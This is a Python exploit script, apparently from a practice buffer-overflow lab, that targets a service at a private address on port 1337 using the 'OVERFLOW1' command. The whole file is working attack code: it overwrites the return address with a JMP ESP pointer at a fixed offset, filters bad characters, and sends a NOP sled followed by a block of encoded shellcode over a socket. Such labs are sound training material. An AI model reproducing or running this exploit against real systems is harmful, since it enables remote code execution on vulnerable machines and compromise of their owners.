#!/usr/bin/env python3
import socket
import struct
def p32(data):
        return struct.pack("<I", data)
host, port = '10.10.57.175', 1337
command = b'OVERFLOW1 '
length = 5000
offset = 1978
jmp_esp = p32(0x625011AF)
new_eip = jmp_esp
all_chars = bytearray(range(1,256))
bad_chars = [
b"\x07",
b"\x2d",
b"\xa0",
b"\x2e"
]
shellcode =  b""
shellcode += b"\xd9\xec\xbe\xbb\xc1\x38\xcc\xd9\x74\x24\xf4"
shellcode += b"\x5a\x29\xc9\xb1\x52\x31\x72\x17\x03\x72\x17"
shellcode += b"\x83\x51\x3d\xda\x39\x59\x56\x99\xc2\xa1\xa7"
shellcode += b"\xfe\x4b\x44\x96\x3e\x2f\x0d\x89\x8e\x3b\x43"
shellcode += b"\x26\x64\x69\x77\xbd\x08\xa6\x78\x76\xa6\x90"
shellcode += b"\xb7\x87\x9b\xe1\xd6\x0b\xe6\x35\x38\x35\x29"
shellcode += b"\x48\x39\x72\x54\xa1\x6b\x2b\x12\x14\x9b\x58"
shellcode += b"\x6e\xa5\x10\x12\x7e\xad\xc5\xe3\x81\x9c\x58"
shellcode += b"\x7f\xd8\x3e\x5b\xac\x50\x77\x43\xb1\x5d\xc1"
shellcode += b"\xf8\x01\x29\xd0\x28\x58\xd2\x7f\x15\x54\x21"
shellcode += b"\x81\x52\x53\xda\xf4\xaa\xa7\x67\x0f\x69\xd5"
shellcode += b"\xb3\x9a\x69\x7d\x37\x3c\x55\x7f\x94\xdb\x1e"
shellcode += b"\x73\x51\xaf\x78\x90\x64\x7c\xf3\xac\xed\x83"
shellcode += b"\xd3\x24\xb5\xa7\xf7\x6d\x6d\xc9\xae\xcb\xc0"
shellcode += b"\xf6\xb0\xb3\xbd\x52\xbb\x5e\xa9\xee\xe6\x36"
shellcode += b"\x1e\xc3\x18\xc7\x08\x54\x6b\xf5\x97\xce\xe3"
shellcode += b"\xb5\x50\xc9\xf4\xba\x4a\xad\x6a\x45\x75\xce"
shellcode += b"\xa3\x82\x21\x9e\xdb\x23\x4a\x75\x1b\xcb\x9f"
shellcode += b"\xda\x4b\x63\x70\x9b\x3b\xc3\x20\x73\x51\xcc"
shellcode += b"\x1f\x63\x5a\x06\x08\x0e\xa1\xc1\x3d\xc4\x9c"
shellcode += b"\x29\x2a\xd8\xde\x58\xf6\x55\x38\x30\x16\x30"
shellcode += b"\x93\xad\x8f\x19\x6f\x4f\x4f\xb4\x0a\x4f\xdb"
shellcode += b"\x3b\xeb\x1e\x2c\x31\xff\xf7\xdc\x0c\x5d\x51"
shellcode += b"\xe2\xba\xc9\x3d\x71\x21\x09\x4b\x6a\xfe\x5e"
shellcode += b"\x1c\x5c\xf7\x0a\xb0\xc7\xa1\x28\x49\x91\x8a"
shellcode += b"\xe8\x96\x62\x14\xf1\x5b\xde\x32\xe1\xa5\xdf"
shellcode += b"\x7e\x55\x7a\xb6\x28\x03\x3c\x60\x9b\xfd\x96"
shellcode += b"\xdf\x75\x69\x6e\x2c\x46\xef\x6f\x79\x30\x0f"
shellcode += b"\xc1\xd4\x05\x30\xee\xb0\x81\x49\x12\x21\x6d"
shellcode += b"\x80\x96\x51\x24\x88\xbf\xf9\xe1\x59\x82\x67"
shellcode += b"\x12\xb4\xc1\x91\x91\x3c\xba\x65\x89\x35\xbf"
shellcode += b"\x22\x0d\xa6\xcd\x3b\xf8\xc8\x62\x3b\x29"
nop_sled = b'\x90' * 24
for bad_char in bad_chars:
        all_chars = all_chars.replace(bad_char, b"")

payload = b''.join(
        [
        command,
        b"A" * offset,
        new_eip,
        nop_sled,
        shellcode,
        b"C" * (length - len(new_eip) - offset - len(shellcode) - len(nop_sled)),
        ])
with socket.socket() as s:
        s.connect((host, port))
        s.send(payload)
